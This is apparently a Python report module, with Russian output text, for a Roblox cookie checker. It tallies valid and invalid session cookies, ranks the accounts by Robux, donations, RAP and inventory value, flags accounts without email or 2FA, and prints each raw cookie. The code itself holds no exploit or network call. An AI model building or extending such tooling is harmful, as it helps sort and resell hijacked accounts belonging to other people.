import statistics
import re
from datetime import datetime

def generate_mass_report(all_info, elapsed_time):
    total = len(all_info)
    valid_items = [i for i in all_info if i.get('status') == '✅']
    invalid_count = total - len(valid_items)
    
    if not valid_items:
        return f"<b>📊 ОТЧЁТ О ПРОВЕРКЕ</b>\n══════════════════════════════════════════════════════\n📦 Всего куки: {total}\n✅ Валидных: 0 | ❌ Невалидных: {invalid_count}\n⏱️ Время: {elapsed_time} сек\n══════════════════════════════════════════════════════"

    def get_stats_block(data_list):
        if not data_list:
            return 0, 0, 0, 0
        non_zero = [x for x in data_list if x > 0]
        perc = int(len(non_zero) / len(data_list) * 100) if data_list else 0
        tot = sum(data_list)
        med = int(statistics.median(data_list)) if data_list else 0
        avg = int(statistics.mean(data_list)) if data_list else 0
        return tot, perc, med, avg

    robux_list = [i['Robux'] for i in valid_items]
    r_tot, r_perc, r_med, r_avg = get_stats_block(robux_list)
    top_robux = sorted(valid_items, key=lambda x: x['Robux'], reverse=True)[:3]
    top_robux_str = "\n".join([f"  {idx+1}) {i['Robux']} R$ — {i['Username']}" for idx, i in enumerate(top_robux) if i['Robux'] > 0])

    yd_list = [i['YearDonate'] for i in valid_items]
    yd_tot, yd_perc, yd_med, yd_avg = get_stats_block(yd_list)
    top_yd = sorted(valid_items, key=lambda x: x['YearDonate'], reverse=True)[:3]
    top_yd_str = "\n".join([f"  {idx+1}) {i['YearDonate']} — {i['Username']}" for idx, i in enumerate(top_yd) if i['YearDonate'] > 0])

    atd_list = [i['AllTimeDonate'] for i in valid_items]
    atd_tot, atd_perc, atd_med, atd_avg = get_stats_block(atd_list)
    top_atd = sorted(valid_items, key=lambda x: x['AllTimeDonate'], reverse=True)[:3]
    top_atd_str = "\n".join([f"  {idx+1}) {i['AllTimeDonate']} — {i['Username']}" for idx, i in enumerate(top_atd) if i['AllTimeDonate'] > 0])

    rap_list = [i['TotalRAP'] for i in valid_items]
    rap_tot, rap_perc, rap_med, rap_avg = get_stats_block(rap_list)
    top_rap = sorted(valid_items, key=lambda x: x['TotalRAP'], reverse=True)[:3]
    top_rap_str = "\n".join([f"  {idx+1}) {i['TotalRAP']} R$ — {i['Username']}" for idx, i in enumerate(top_rap) if i['TotalRAP'] > 0])

    # ОЦЕНКА ИНВЕНТАРЯ (СУММАРНО)
    total_inv_value = sum(i.get('InventoryValue', 0) for i in valid_items)
    all_valuable = []
    for i in valid_items:
        all_valuable.extend(i.get('ValuableItems', []))
    
    top_items = {}
    for item in all_valuable:
        name = item.get('name', '?')
        if name not in top_items:
            top_items[name] = 0
        top_items[name] += item.get('estimated_usd', 0)
    
    sorted_items = sorted(top_items.items(), key=lambda x: x[1], reverse=True)[:5]
    top_items_str = "\n".join([f"  {idx+1}) {name} — ⏣ {value:.2f}$" for idx, (name, value) in enumerate(sorted_items) if value > 0])

    game_totals = {}
    tot_game_robux = 0
    for i in valid_items:
        for g_name, passes in i.get('PurchasedGamepasses', {}).items():
            g_sum = sum(p['price'] for p in passes)
            game_totals[g_name] = game_totals.get(g_name, 0) + g_sum
            tot_game_robux += g_sum

    top_games = sorted(game_totals.items(), key=lambda x: x[1], reverse=True)[:5]
    formatted_games = [f"{g_title}({g_amount} R$)" for g_title, g_amount in top_games]
    top_games_str = ", ".join(formatted_games)

    voice_count = sum(1 for i in valid_items if i.get('Voice'))
    no_email_count = sum(1 for i in valid_items if not i.get('EmailSet'))
    voice_perc = int(voice_count / len(valid_items) * 100) if valid_items else 0
    no_email_perc = int(no_email_count / len(valid_items) * 100) if valid_items else 0

    res = f"<b>📊 ОТЧЁТ О ПРОВЕРКЕ</b>\n"
    res += f"══════════════════════════════════════════════════════\n"
    res += f"📦 Всего куки: <b>{total}</b>\n"
    res += f"✅ Валидных: <b>{len(valid_items)}</b> | ❌ Невалидных: <b>{invalid_count}</b>\n"
    res += f"⏱️ Время: <b>{elapsed_time} сек</b>\n\n"

    res += f"💰 <b>Robux: {r_tot}</b> ({r_perc}% - MED: {r_med}, AVG: {r_avg})\n"
    if top_robux_str:
        res += f"Топ Robux:\n{top_robux_str}\n"
    res += "\n"

    res += f"💎 <b>1-year Donate: {yd_tot}</b> ({yd_perc}% - MED: {yd_med}, AVG: {yd_avg})\n"
    if top_yd_str:
        res += f"Топ 1-year Donate:\n{top_yd_str}\n"
    res += "\n"

    res += f"🕰 <b>All-time donate: {atd_tot}</b> ({atd_perc}% - MED: {atd_med}, AVG: {atd_avg})\n"
    if top_atd_str:
        res += f"Топ All-time donate:\n{top_atd_str}\n"
    res += "\n"

    res += f"🧢 <b>UGC RAP: {rap_tot}</b> ({rap_perc}% - MED: {rap_med}, AVG: {rap_avg})\n"
    if top_rap_str:
        res += f"Топ UGC RAP:\n{top_rap_str}\n"
    res += "\n"

    # ОЦЕНКА ИНВЕНТАРЯ
    res += f"💰 <b>ОЦЕНКА ИНВЕНТАРЯ: ⏣ {total_inv_value:.2f}$</b>\n"
    if sorted_items:
        res += f"🏆 Топ предметов по стоимости:\n{top_items_str}\n"
    else:
        res += f"🏆 Топ предметов: ❌ (нет данных)\n"
    res += "\n"

    res += f"🎯 <b>Game Purchases:</b>\n"
    res += f"  {top_games_str if top_games_str else 'Нет'}\n  | Всего: <b>{tot_game_robux} R$</b>\n\n"

    res += f"🎤 Voice: <b>{voice_count} ({voice_perc}%)</b>\n"
    res += f"📧 Без привязанной почты: <b>{no_email_count} ({no_email_perc}%)</b>\n"
    res += f"══════════════════════════════════════════════════════"

    return res

def generate_full_txt_report(info):
    un = info.get('Username', '?')
    
    r = "╔══════════════════════════════════════════════════════════╗\n"
    r += "║  🎮 KAI CHECKER — ПОЛНЫЙ ОТЧЁТ                        ║\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  📋 Пользователь: {un}\n"
    r += f"║  ID: {info.get('UserID', '?')}\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,}\n"
    r += f"║  💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
    r += f"║  💸 1-Year Donate: ⏣ {info.get('YearDonate', 0):,}\n"
    r += f"║  🕰 All-Time Donate: ⏣ {info.get('AllTimeDonate', 0):,}\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += "║  🛡️ БЕЗОПАСНОСТЬ:\n"
    r += f"║  📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
    r += f"║  🎤 Голос (Voice): {'✅' if info.get('Voice') else '❌'}\n"
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += "║  📦 КУПЛЕННЫЕ ГЕЙМПАССЫ И ИГРОВЫЕ ТОВАРЫ:\n"
    
    gp = info.get('PurchasedGamepasses', {})
    if gp:
        for game, passes in gp.items():
            game_total = sum(p['price'] for p in passes)
            r += f"║  🎮 {game} (⏣ {game_total:,}):\n"
            for p in passes[:5]:
                r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
            if len(passes) > 5:
                r += f"║      └ ... и ещё {len(passes) - 5}\n"
    else:
        r += "║  ❌ Нет покупок / геймпассов\n"
    
    # ОЦЕНКА ИНВЕНТАРЯ
    inv_value = info.get('InventoryValue', 0)
    valuable = info.get('ValuableItems', [])
    r += "╠══════════════════════════════════════════════════════════╣\n"
    r += f"║  💰 ОЦЕНКА ИНВЕНТАРЯ: ⏣ {inv_value:.2f}$\n"
    if valuable:
        r += "║  🏆 САМЫЕ ЦЕННЫЕ:\n"
        for i, item in enumerate(valuable[:5], 1):
            r += f"║     {i}) {item['name']} — ⏣ {item['estimated_usd']:.2f}$\n"
    else:
        r += "║     ❌ Нет данных для оценки\n"
        
    r += "╚══════════════════════════════════════════════════════════╝\n\n"
    r += f"🍪 COOKIE:\n{info.get('Cookie', '')}"
    return r